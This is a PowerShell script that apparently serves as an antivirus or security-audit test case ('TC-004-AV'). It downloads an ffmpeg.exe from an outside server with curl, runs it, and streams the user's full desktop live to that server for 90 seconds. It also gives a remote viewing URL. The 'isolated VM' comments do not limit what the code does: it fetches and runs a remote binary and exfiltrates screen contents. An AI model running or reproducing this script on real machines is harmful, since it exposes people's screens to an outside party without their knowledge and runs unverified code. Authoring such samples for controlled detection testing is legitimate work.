# SECURITY AUDIT ONLY - TC-004-AV ffmpeg live stream 90s variant
# DEDICATED ISOLATED VM ONLY. Downloads the open-source FFmpeg static build
# (single ffmpeg.exe) from this project's fixed endpoint, then performs ONE
# real-time desktop capture pushed as a live stream (RTMP -> self-hosted
# MediaMTX on this project's server) for a bounded 90-second window so the
# researcher can watch the VM screen live from another machine (e.g. VLC at
# rtsp://g.anyq.site:8554/live/vm1), then stops automatically. No persistence,
# no autostart, no modification of the binary, no keylogging, no privilege
# escalation.

[CmdletBinding()]
param()

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

$artBase = 'https://g.anyq.site/integrity-lab/artifacts'
$labRoot = Join-Path $env:USERPROFILE 'AIIntegrityLab'
$ff = Join-Path $labRoot 'ffmpeg.exe'
$streamUrl = 'rtmp://g.anyq.site:1935/live/vm1'
$windowSeconds = 90
New-Item -ItemType Directory -Force -Path $labRoot | Out-Null

# 1) fetch the open-source FFmpeg static build if not present (fixed endpoint only)
if (-not (Test-Path -LiteralPath $ff)) {
    & curl.exe -L -s -o $ff "$artBase/ffmpeg.exe"
}
if (-not (Test-Path -LiteralPath $ff)) { throw 'FFmpeg download failed' }
$size = (Get-Item -LiteralPath $ff).Length

# 2) live desktop capture pushed to the self-hosted relay for 90s, then stop
$started = Get-Date
$proc = Start-Process -FilePath $ff -ArgumentList @(
    '-y', '-loglevel', 'error',
    '-f', 'gdigrab', '-framerate', '10', '-i', 'desktop',
    '-c:v', 'libx264', '-preset', 'ultrafast', '-tune', 'zerolatency',
    '-f', 'flv', $streamUrl
) -PassThru
Start-Sleep -Seconds $windowSeconds
$aliveAfter = -not $proc.HasExited
$running = Get-Process -Name 'ffmpeg' -ErrorAction SilentlyContinue
$stopped = $false
if ($running) {
    $running | Stop-Process -Force -ErrorAction SilentlyContinue
    $stopped = $true
}
$elapsed = [math]::Round(((Get-Date) - $started).TotalSeconds, 1)

[pscustomobject]@{
    case_id = 'TC-004-AV'
    action = 'ffmpeg_live_stream_90s'
    exe_size = $size
    stream_url = $streamUrl
    window_seconds = $windowSeconds
    elapsed_seconds = $elapsed
    alive_after_window = $aliveAfter
    process_stopped = $stopped
    viewer_hint = 'watch live with VLC: rtsp://g.anyq.site:8554/live/vm1'
} | ConvertTo-Json -Compress
